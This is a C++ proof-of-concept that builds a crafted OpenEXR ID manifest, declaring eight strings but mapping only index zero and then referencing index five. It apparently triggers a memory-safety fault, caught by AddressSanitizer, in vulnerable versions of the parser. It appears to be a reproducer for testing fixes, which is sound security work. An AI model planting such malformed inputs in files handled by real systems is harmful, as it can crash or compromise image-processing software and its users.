//
// PoC for the OpenEXR IDManifest parser: feeds a crafted serialized
// ID manifest to the public Imf::IDManifest(const char*, const char*)
// constructor through in-contract input (a manifest blob as stored in
// an EXR file's idManifest attribute).
//
// The manifest declares 8 strings but a mapping table that only covers
// string index 0, then references string index 5 from a channel group's
// ID table. Whether that reference is safe depends on how the mapping
// table was sized, so this input distinguishes the parsers.
//
// Build: g++ probe.c -o probe <openexr cflags> <openexr libs>
//

#include <ImfIDManifest.h>

#include <cstdio>
#include <string>
#include <vector>

//
// Ask the sanitizer runtime itself to abort on error (the conventional
// rc 134 / SIGABRT failure signal) instead of exiting with status 1.
// Inert when built without AddressSanitizer.
//
extern "C" const char*
__asan_default_options (void)
{
    return "abort_on_error=1:halt_on_error=1";
}

static void
put32 (std::vector<char>& b, unsigned int v)
{
    char e[4] = {(char) (v & 0xff),
                 (char) ((v >> 8) & 0xff),
                 (char) ((v >> 16) & 0xff),
                 (char) ((v >> 24) & 0xff)};
    b.insert (b.end (), e, e + 4);
}

int
main (void)
{
    std::vector<char> blob;

    //
    // manifest version
    //
    put32 (blob, 0);

    //
    // string list: 8 strings, each 2 bytes long. Strings 1..7 begin
    // with a prefix-length byte of 0 (no characters shared with the
    // previous string), which the parser expands to the second byte.
    //
    put32 (blob, 8);                       // numberOfStrings
    for (int i = 0; i < 8; ++i)
        blob.push_back ((char) 2);         // length table (varint)
    blob.push_back ('\0'); blob.push_back ('A');
    for (int i = 1; i < 8; ++i)
    {
        blob.push_back ('\0');
        blob.push_back ((char) ('A' + i));
    }

    //
    // string-index mapping table (RLE): a single run covering
    // string index 0 only.
    //
    put32 (blob, 1);                       // rleLength: one run
    put32 (blob, 0);                       // first index
    put32 (blob, 0);                       // last index

    //
    // one channel group manifest
    //
    put32 (blob, 1);                       // manifestEntries

    put32 (blob, 1);                       // channels: 1 string
    blob.push_back ((char) 1);
    blob.push_back ('R');

    put32 (blob, 1);                       // components: 1 string
    blob.push_back ((char) 2);
    blob.push_back ('I');
    blob.push_back ('D');

    blob.push_back ((char) 0);             // lifetime: LIFETIME_FRAME

    put32 (blob, 0);                       // hashScheme: empty pascal string
    put32 (blob, 0);                       // encodingScheme: empty

    blob.push_back ((char) 1);             // storageScheme: 32 bit IDs
    put32 (blob, 1);                       // tableSize: one ID entry

    put32 (blob, 7);                       // the ID itself

    blob.push_back ((char) 5);             // string index 5 for its component

    std::printf (
        "parsing %zu byte manifest (8 strings, mapping covers index 0, "
        "ID references string index 5)\n",
        blob.size ());

    try
    {
        Imf::IDManifest manifest (blob.data (), blob.data () + blob.size ());
        std::printf (
            "manifest parsed: %zu channel group(s)\n", manifest.size ());
    }
    catch (const std::exception& e)
    {
        std::printf ("manifest rejected: %s\n", e.what ());
    }

    return 0;
}
